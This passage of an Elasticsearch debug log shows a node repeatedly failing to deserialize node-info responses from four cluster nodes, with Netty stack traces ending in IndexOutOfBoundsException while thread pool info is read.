Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,802][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [RgzCfs2_RE27p6RgzEb1Jw]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,802][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lXDpSZ3OQCu6eVulQVcbiQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8528
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,803][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [WqnW6SX3TfCLTbBvFcYQgA]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8434
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,804][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [myWkK47kRxSh93CRKH5O3w]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8435
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,139][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [RgzCfs2_RE27p6RgzEb1Jw]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,139][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [WqnW6SX3TfCLTbBvFcYQgA]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:310)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8434
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,140][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lXDpSZ3OQCu6eVulQVcbiQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8528
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,144][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [myWkK47kRxSh93CRKH5O3w]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
